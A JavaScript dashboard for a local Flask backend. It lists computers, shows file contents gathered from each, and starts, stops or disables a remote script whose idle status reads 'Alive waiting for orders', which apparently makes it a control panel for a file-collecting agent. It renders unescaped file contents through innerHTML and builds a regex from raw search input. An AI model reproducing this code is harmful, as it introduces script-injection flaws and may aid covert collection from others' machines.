const BACKEND_URL = "http://127.0.0.1:5000";

let currentContent = {}; // Variable to store the full content

// ... (previous functions: fetch computers, load content, display content, search content, start script, stop script) ...


// Fetch the computer list from Flask backend
fetch(`${BACKEND_URL}/data`)
    .then(response => response.json())
    .then(data => {
        let list = document.getElementById("computer-list");
        data.forEach(comp => {
            let li = document.createElement("li");
            li.textContent = comp;
            li.onclick = () => loadContent(comp);
            list.appendChild(li);
        });
    })
    .catch(error => console.error('Error fetching computers:', error));

// Fetch content of a selected computer
function loadContent(name) {
    // Show loading state
    let contentArea = document.getElementById("content-area");
    contentArea.textContent = "Loading content...";
    document.getElementById("search-input").value = ""; // Clear search input on new load

    fetch(`${BACKEND_URL}/data/${name}`)
        .then(response => response.json())
        .then(data => {
            currentContent = data.content; // Store the content
            displayContent(currentContent); // Display the full content initially
        })
        .catch(error => {
            contentArea.textContent = "Error loading content.";
            console.error('Error:', error);
        });
}

// Function to display content, now with an optional query for highlighting
function displayContent(content, query = null) {
    let text = "";
    for (let file in content) {
        let fileContent = content[file];
        if (query) {
            // Use a regular expression with the 'gi' flags for global and case-insensitive search
            const regex = new RegExp(query, 'gi');
            fileContent = fileContent.replace(regex, `<span class="highlight">$&</span>`);
        }
        text += `=== ${file} ===\n${fileContent}\n\n`;
    }
    // Use innerHTML instead of textContent to render the HTML tags
    document.getElementById("content-area").innerHTML = text;
}

// Function to search the content and highlight found text
function searchContent() {
    const query = document.getElementById("search-input").value.trim();
    if (!query) {
        // If the query is empty, display all content without highlighting
        displayContent(currentContent);
        return;
    }

    const filteredContent = {};
    for (let file in currentContent) {
        if (currentContent[file].toLowerCase().includes(query.toLowerCase())) {
            filteredContent[file] = currentContent[file];
        }
    }

    if (Object.keys(filteredContent).length > 0) {
        displayContent(filteredContent, query);
    } else {
        document.getElementById("content-area").innerHTML = "No matching content found.";
    }
}

// Function to fetch the script status
async function fetchStatus() {
    try {
        const response = await fetch(`${BACKEND_URL}/status`);
        const data = await response.json();
        const statusMessage = document.getElementById('status-message');
        const startBtn = document.getElementById('start-button');
        const stopBtn = document.getElementById('stop-button');
        const disableBtn = document.getElementById('disable-button');

        statusMessage.innerText = `Status: ${data.status}`;

        if (data.status === "Alive waiting for orders") {
            startBtn.style.display = 'block';
            stopBtn.style.display = 'none';
            disableBtn.style.display = 'block';
        } else if (data.status === "running") {
            startBtn.style.display = 'none';
            stopBtn.style.display = 'block';
            disableBtn.style.display = 'none';
        } else if (data.status === "disabled") {
            startBtn.style.display = 'none';
            stopBtn.style.display = 'none';
            disableBtn.style.display = 'none';
        } else {
            startBtn.style.display = 'none';
            stopBtn.style.display = 'none';
            disableBtn.style.display = 'none';
        }
    } catch (error) {
        console.error('Error fetching status:', error);
        document.getElementById('status-message').innerText = 'Status: Disconnected';
        document.getElementById('start-button').style.display = 'none';
        document.getElementById('stop-button').style.display = 'none';
        document.getElementById('disable-button').style.display = 'none';
    }
}

async function disableProgram() {
    try {
        const response = await fetch(`${BACKEND_URL}/disable`);
        const data = await response.json();
        if (response.ok) {
            console.log("Disable message sent:", data.message);
            fetchStatus(); // Update status after command
        }
    } catch (error) {
        console.error('Error sending disable command:', error);
    }
}

async function startScript() {
    try {
        const response = await fetch(`${BACKEND_URL}/start`);
        const data = await response.json();
        if (response.ok) {
            console.log("Approval message sent:", data.message);
            fetchStatus(); // Update status after command
        }
    } catch (error) {
        console.error('Error sending start:', error);
    }
}

async function stopScript() {
    try {
        const response = await fetch(`${BACKEND_URL}/stop`);
        const data = await response.json();
        if (response.ok) {
            console.log("Stop message sent:", data.message);
            fetchStatus(); // Update status after command
        }
    } catch (error) {
        console.error('Error sending stop:', error);
    }
}

// Event listeners for the new buttons
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('start-button').addEventListener('click', startScript);
    document.getElementById('stop-button').addEventListener('click', stopScript);
    document.getElementById('disable-button').addEventListener('click', disableProgram);
    
    // Initial fetch and continuous updates
    setInterval(fetchStatus, 2000); 
    fetchStatus();
});